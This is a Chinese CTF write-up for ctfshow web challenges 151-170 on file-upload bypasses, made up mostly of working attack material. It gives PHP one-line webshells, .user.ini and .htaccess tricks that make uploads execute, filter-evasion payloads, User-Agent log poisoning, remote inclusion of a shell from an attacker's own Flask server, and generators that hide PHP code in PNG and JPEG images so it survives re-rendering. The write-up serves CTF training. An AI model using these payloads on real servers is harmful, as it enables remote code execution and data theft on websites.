@@ -1,0 +1,617 @@
+---
+title: "ctfshow_web入门_151-170_文件上传"
+date: 2024-10-27
+---
+# 文件上传
+
+## web151 前端验证
+
+```js
+<script>
+layui.use('upload', function(){
+  var upload = layui.upload;
+   
+  //执行实例
+  var uploadInst = upload.render({
+    elem: '#upload' //绑定元素
+    ,url: '/upload/' //上传接口
+    ,done: function(res){
+    	if(res.code==0){
+    		$("#result").html("文件上传成功，路径："+res.msg);
+    	}else{
+    		$("#result").html("文件上传失败，失败原因："+res.msg);
+    	}
+      
+    }
+    ,error: function(){
+      $("#result").html("文件上传失败");
+    }
+  });
+});
+</script>
+```
+
+先正常上传图片，使用burp suite在数据包中插入木马，修改filename="test.php"即可
+
+## web152 MIME校验
+
+```http
+Content-Type: image/png
+```
+
+注意
+
+- 修改Content-Type
+- 修改filename="test.php"
+
+## web153 .user.ini
+
+使用.user.ini
+注意.user.ini在同目录下生效
+
+上传.user.ini
+
+```
+auto_prepend_file=a.txt
+```
+
+上传a.txt
+
+```
+<?php eval($_GET['a']);
+```
+
+访问`url/upload/?a=system('cat /var/www/html/flag.php');`得到flag
+
+## web154 过滤了`php`
+
+与web153相比，过滤了`php`
+
+使用.user.ini
+
+上传.user.ini
+
+```
+auto_prepend_file=a.txt
+```
+
+上传a.txt
+
+```
+<?=@eval($_GET['a']);?>
+```
+
+访问`url/upload/?a=system('cat /var/www/html/flag.php');`得到flag
+
+## web155 与web154相同
+
+与web154相同
+
+## web156 过滤关键词`php`, `[]`
+
+过滤关键词`php`, `[]`
+使用`{}`
+
+上传.user.ini
+
+```
+auto_prepend_file=a.txt
+```
+
+上传a.txt
+
+```php
+<?=@eval($_GET{'a'});?>
+```
+
+访问`url/upload/?a=system('cat /var/www/html/flag.php');`得到flag
+
+## web157 过滤关键词
+
+过滤关键词
+
+```
+php
+[]
+;
+{}
+```
+
+直接执行代码
+
+上传.user.ini
+
+```
+auto_prepend_file=a.txt
+```
+
+上传a.txt
+
+```php
+<?=@system("tac ../flag.*")?>
+```
+
+访问`url/upload/`得到flag
+
+## web158 与web157相同
+
+与web157相同
+
+## web159 过滤`()`
+
+过滤`()`
+
+上传.user.ini
+
+```
+auto_prepend_file=a.txt
+```
+
+上传a.txt
+
+```php
+<?=`cat ../fl*`?>
+```
+
+## web160 禁用``{}()[];等字符,单双引号可以使用
+
+禁用``{}()[];等字符,单双引号可以使用
+
+尝试文件包含，过滤log关键字
+
+使用`.`连接`log`绕过过滤
+
+上传.user.ini
+
+```
+auto_prepend_file=a.txt
+```
+
+上传a.txt
+
+```php
+<?=include"/var/lo"."g/nginx/access.lo"."g"?>
+```
+
+拦截请求 修改UA头
+
+```php
+<?php @eval($_GET['a']);?>
+```
+
+```
+/upload/index.php?a=system("tac ../flag.php");
+```
+
+得到flag
+
+## web161 文件头校验,
+
+与web160相比，限制上传类型为png,并且添加了文件头校验,
+
+```html
+<button type="button" class="layui-btn" id="upload" lay-data="{url: 'upload.php', accept: 'images',exts:'png'}">
+```
+
+- 使用`GIF89a`绕过
+- 修改content-type为`image/png`
+
+上传.user.ini
+
+```
+GIF89a
+auto_prepend_file=a.txt
+```
+
+上传a.txt
+
+```php
+GIF89a
+<?=include"/var/lo"."g/nginx/access.lo"."g"?>
+```
+
+拦截请求 修改UA头
+
+```php
+<?php @eval($_GET['a']);?>
+```
+
+```
+/upload/index.php?a=system("tac ../flag.php");
+```
+
+得到flag
+
+## web162 远程包含 需要远程服务器
+
+远程包含
+需要远程服务器
+
+在服务器上建立flask服务,在同目录下搞一个`233`文件的一句话木马
+
+```python
+from flask import Flask, send_file
+
+app = Flask(__name__)
+
+@app.route("/233")
+def index():
+    return send_file("233")
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=8886)
+```
+
+题目过滤`.`
+
+将ip转换成为长整型
+
+```python
+def ip2long(ip):
+    ip_list = ip.split('.')  
+    result = 0
+    for i in range(4):  
+        result = result + int(ip_list[i]) * 256 ** (3 - i)
+    return result
+
+print(ip2long("8.217.215.183"))
+
+输出：
+148494263
+```
+
+上传.user.ini
+注意检测png类型
+
+```
+GIF89a
+auto_prepend_file=http://148494263:8886/233
+```
+
+访问`/upload/`执行命令
+
+## web163 与web162相同
+
+与web162相同
+
+## web164 文件包含,图片马
+
+文件包含,图片马
+
+```php
+<?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+
+
+
+$img = imagecreatetruecolor(32, 32);
+
+for ($y = 0; $y < sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+
+imagepng($img,'./7.png');
+?>
+
+
+//<?=$_GET[0]($_POST[1]);?>
+```
+
+上传7.png，然后点击查看图片，url加上`&0=system`,post传参`1=tac f*`
+
+```http
+/download.php?image=9eb9cd58b9ea5e04c890326b5c1f471f.png&0=system
+1=tac f*
+```
+
+ctrl+s保存图片，010Editor打开，得到flag
+
+## web165 jpg二次渲染
+
+jpg二次渲染
+
+[1.jpg_百度网盘链接下载](https://pan.baidu.com/s/1qMHSxxjbKLrIezb93M0wggpwd=komm)
+
+```php
+<?php
+    $miniPayload = '<?=system("cat f*");?>';
+
+
+    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+        die('php-gd is not installed');
+    }
+
+    if(!isset($argv[1])) {
+        //die('php jpg_payload.php <jpg_name.jpg>');
+        $argv[1] = '1.jpg';
+    }
+
+    set_error_handler("custom_error_handler");
+
+    for($pad = 0; $pad < 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis->readShort() != 0xFFD8) {
+            die('Incorrect SOI marker');
+        }
+
+        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
+            $marker = $dis->readByte();
+            $size = $dis->readShort() - 2;
+            $dis->skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis->seek();
+                $outStreamTmp =
+                    substr($outStream, 0, $startPos) .
+                    $miniPayload .
+                    str_repeat("\0",$nullbytePayloadSize) .
+                    substr($outStream, $startPos);
+                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis->eof())) {
+                        if($dis->readByte() === 0xFF) {
+                            if($dis->readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis->seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream =
+                        substr($outStream, 0, $startPos) .
+                        $miniPayload .
+                        substr(
+                            str_repeat("\0",$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage('payload_'.$argv[1], $outStream)) {
+                    die('Success!');
+                } else {
+                	echo "error";
+                    break;
+                }
+            }
+        }
+    }
+    unlink('payload_'.$argv[1]);
+    die('Something\'s wrong');
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this->binData = '';
+            $this->order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die('File not exists ['.$filename.']');
+                $this->binData = file_get_contents($filename);
+            } else {
+                $this->binData = $filename;
+            }
+            $this->size = strlen($this->binData);
+        }
+
+        public function seek() {
+            return ($this->size - strlen($this->binData));
+        }
+
+        public function skip($skip) {
+            $this->binData = substr($this->binData, $skip);
+        }
+
+        public function readByte() {
+            if($this->eof()) {
+                die('End Of File');
+            }
+            $byte = substr($this->binData, 0, 1);
+            $this->binData = substr($this->binData, 1);
+            return ord($byte);
+        }
+
+        public function readShort() {
+            if(strlen($this->binData) < 2) {
+                die('End Of File');
+            }
+            $short = substr($this->binData, 0, 2);
+            $this->binData = substr($this->binData, 2);
+            if($this->order) {
+                $short = (ord($short[1]) << 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) << 8) + ord($short[1]);
+            }
+            return $short;
+        }
+
+        public function eof() {
+            return !$this->binData||(strlen($this->binData) === 0);
+        }
+    }
+?>
+```
+
+生成图片马后上传，然后访问下载图片，用010editor打开，得到flag
+
+## web166 限制上传zip文件
+
+限制上传zip文件
+先正常上传zip文件，修改数据包，将一句话木马写入test.zip
+
+上传数据包：
+
+```http
+POST /upload.php HTTP/1.1
+Host: bb13163f-2b94-4132-8258-aaf2bf98c8a2.challenge.ctf.show
+Content-Length: 350
+Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqpP7QSA2vxZ23HFA
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://bb13163f-2b94-4132-8258-aaf2bf98c8a2.challenge.ctf.show
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://bb13163f-2b94-4132-8258-aaf2bf98c8a2.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
+
+------WebKitFormBoundaryqpP7QSA2vxZ23HFA
+Content-Disposition: form-data; name="file"; filename="test.zip"
+Content-Type: application/x-zip-compressed
+
+<?php @eval($_POST['attack']);?>
+------WebKitFormBoundaryqpP7QSA2vxZ23HFA--
+```
+
+利用：
+
+```http
+POST //upload/download.php?file=c91fb8000c1c63ac92c12ed7e87323e8.zip HTTP/1.1
+Host: bb13163f-2b94-4132-8258-aaf2bf98c8a2.challenge.ctf.show
+Content-Length: 45
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: zh-CN,zh;q=0.9
+Upgrade-Insecure-Requests: 1
+Origin: https://bb13163f-2b94-4132-8258-aaf2bf98c8a2.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://bb13163f-2b94-4132-8258-aaf2bf98c8a2.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+
+attack=system%28%27cat+..%2Fflag.php%27%29%3B
+```
+
+## web167 .htaccess
+
+限制上传jpg
+
+先上传.htaccess
+将.jpg后缀文件当作php解析
+
+```
+AddType application/x-httpd-php .jpg
+```
+
+将木马文件后缀改为jpg，content-type改为jpeg即可成功上传
+
+## web168 过滤 eval system post get
+
+将eval和system以及post和get过滤了
+
+使用反引号来进行命令执行
+
+```php
+<?php echo `tac ../flagaa.php`;?>
+```
+
+数据包：
+
+```http
+POST /upload.php HTTP/1.1
+Host: a901119c-3ad8-4335-91f3-e77391c5c954.challenge.ctf.show
+Content-Length: 203
+Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOPUCG44eYfS2ybvS
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://a901119c-3ad8-4335-91f3-e77391c5c954.challenge.ctf.show
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://a901119c-3ad8-4335-91f3-e77391c5c954.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
+
+------WebKitFormBoundaryOPUCG44eYfS2ybvS
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: image/png
+
+<?php echo `ls ../`;?>
+------WebKitFormBoundaryOPUCG44eYfS2ybvS--
+```
+
+## web169 .user.ini日志包含
+
+.user.ini日志包含
+
+```
+auto_append_file=/var/log/nginx/access.log
+```
+
+User-Agent插入php木马
+
+```php
+<?php @eval($_POST['attack']);?>
+```
+
+还需要上传一个index.php，内容随便写
+
+然后在url/upload/利用木马
+
+## web170
+
+与web169相同
